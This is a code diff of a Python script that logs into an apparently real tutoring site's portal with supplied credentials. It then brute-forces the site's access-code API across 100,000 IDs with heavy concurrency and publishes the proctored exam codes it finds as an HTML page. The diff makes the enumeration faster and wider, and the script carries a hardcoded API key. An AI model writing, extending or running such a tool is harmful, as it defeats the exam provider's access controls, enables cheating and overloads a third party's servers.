@@ -1,11 +1,9 @@
 import sys
-import requests as r
-import threading
+import aiohttp
+import asyncio
 import traceback
 import datetime
 from bs4 import BeautifulSoup as bs
-import copy
-import time
 import os
 
 BASE_URL = "https://classes.brilliantpala.org/"
@@ -16,78 +14,85 @@ HEADERS = {
     "X-Key": "d77fe6ed65feef09aeb8cd2d7d8a8044e9f1a79ed102f41e487f49e3713b43d2",
 }
 
-os.mkdir("build")
+try:
+    os.mkdir("build")
+except FileExistsError:
+    pass
 os.chdir("./build")
 results = []
 count = 0
 
+async def login(username, password):
+    async with aiohttp.ClientSession() as session:
+        async with session.get(BASE_URL) as res:
+            content = await res.text()
+            bs_content = bs(content, "html.parser")
+            csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]
 
-def login(username, password):
-    res = r.get(BASE_URL)
-    bs_content = bs(res.content, "html.parser")
-    csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]
+        data = {
+            "csrfmiddlewaretoken": csrf,
+            "username": str(username),
+            "password": str(password),
+        }
 
-    data = {
-        "csrfmiddlewaretoken": csrf,
-        "username": str(username),
-        "password": str(password),
-    }
-
-    res = r.post(
-        BASE_URL + "login/?next=",
-        data=data,
-        headers={"Referer": BASE_URL, "Cookie": "csrftoken=" + csrf},
-        allow_redirects=False,
-    )
-    if res.status_code == 302:
-        HEADERS["Cookie"] = (
-            "sessionid="
-            + res.cookies["sessionid"]
-            + "; csrftoken="
-            + res.cookies["csrftoken"]
-        )
-
-        res = r.get(
-            BASE_URL + "logout_devices/?next=/",
-            headers=HEADERS,
-        )
-
-        bs_content = bs(res.content, "html.parser")
-        csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]
-
-        r.post(
-            BASE_URL + "logout_devices/?next=/",
-            data={"csrfmiddlewaretoken": csrf},
-            headers=HEADERS,
-        )
-        print("Logged in.")
-        i = 1000
-        p = []
-        s = r.Session()
-        while i < 10000:
-            k = copy.deepcopy(i)
-            h = threading.Thread(target=code, args=(k, s), daemon=True)
-            p.append(h)
-            if len(p) >= 20:
-                time.sleep(2)
-                p = []
-            h.start()
-            i += 1
-        h.join()
-        f = open("index.html", "w+")
-        formatted = "\n".join(
-            [
-                f"""<tr>
-                  <td>{code}</td>
-                  <td><a href='{BASE_URL}exams/run/{slug}/start/'>{title}</a></td>
-                </tr>"""
-                for code, title, _, slug in sorted(
-                    results, key=lambda x: x[2], reverse=True
+        async with session.post(
+            BASE_URL + "login/?next=",
+            data=data,
+            headers={"Referer": BASE_URL, "Cookie": "csrftoken=" + csrf},
+            allow_redirects=False,
+        ) as res:
+            if res.status == 302:
+                cookies = res.cookies
+                HEADERS["Cookie"] = (
+                    "sessionid="
+                    + cookies["sessionid"].value
+                    + "; csrftoken="
+                    + cookies["csrftoken"].value
                 )
-            ]
-        )
-        f.write(
-            f"""
+
+                async with session.get(
+                    BASE_URL + "logout_devices/?next=/",
+                    headers=HEADERS,
+                ) as res:
+                    content = await res.text()
+                    bs_content = bs(content, "html.parser")
+                    csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]
+
+                async with session.post(
+                    BASE_URL + "logout_devices/?next=/",
+                    data={"csrfmiddlewaretoken": csrf},
+                    headers=HEADERS,
+                ) as res:
+                    pass
+
+                print("Logged in.")
+                
+                # Create a semaphore to limit concurrent requests
+                sem = asyncio.Semaphore(100)  # Limit to 20 concurrent requests
+                
+                # Create tasks for all codes
+                tasks = []
+                for i in range(0, 100000):
+                    tasks.append(asyncio.create_task(fetch_code(i, session, sem)))
+                
+                # Wait for all tasks to complete
+                await asyncio.gather(*tasks)
+                
+                # Generate HTML
+                f = open("index.html", "w+")
+                formatted = "\n".join(
+                    [
+                        f"""<tr>
+                          <td>{code}</td>
+                          <td><a href='{BASE_URL}exams/run/{slug}/start/'>{title}</a></td>
+                        </tr>"""
+                        for code, title, _, slug in sorted(
+                            results, key=lambda x: x[2], reverse=True
+                        )
+                    ]
+                )
+                f.write(
+                    f"""
 <html>
   <head>
     <title>Brilliant Proctored Access Codes</title>
@@ -143,42 +148,47 @@ def login(username, password):
     </footer>
   </body>
 </html>"""
-        )
-        f.close()
-        res = r.get(
-            BASE_URL + "logout",
-            headers=HEADERS,
-        )
-        print("Process complete with", count, "codes found.")
-        exit(0)
-
-
-def code(k, s):
-    global count
-    try:
-        res = s.get(
-            BASE_URL + f"api/v2.3/access_codes/{k}/exams/",
-            headers=HEADERS,
-        )
-        if res.status_code == 200:
-            result = res.json()["results"][0]
-            results.append(
-                (
-                    k,
-                    result["title"],
-                    (
-                        datetime.datetime.fromisoformat(result["end_date"])
-                        if isinstance(result["end_date"], str)
-                        else datetime.datetime.fromisoformat(result["start_date"])
-                    ),
-                    result["slug"],
                 )
-            )
-            count += 1
-            print(k, "yay code")
-    except Exception:
-        print(traceback.format_exc())
+                f.close()
+                
+                async with session.get(
+                    BASE_URL + "logout",
+                    headers=HEADERS,
+                ) as res:
+                    pass
+                    
+                print("Process complete with", count, "codes found.")
+                return
 
+async def fetch_code(k, session, sem):
+    global count
+    async with sem:  # This ensures we don't exceed the concurrent request limit
+        try:
+            async with session.get(
+                BASE_URL + f"api/v2.3/access_codes/{k}/exams/",
+                headers=HEADERS,
+            ) as res:
+                if res.status == 200:
+                    result = (await res.json())["results"][0]
+                    results.append(
+                        (
+                            k,
+                            result["title"],
+                            (
+                                datetime.datetime.fromisoformat(result["end_date"])
+                                if isinstance(result["end_date"], str)
+                                else datetime.datetime.fromisoformat(result["start_date"])
+                            ),
+                            result["slug"],
+                        )
+                    )
+                    count += 1
+                    print(k, "yay code")
+        except Exception:
+            print(traceback.format_exc())
 
-login(sys.argv[1], sys.argv[2])
-exit(0)
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python access_html.py <username> <password>")
+        sys.exit(1)
+    asyncio.run(login(sys.argv[1], sys.argv[2]))
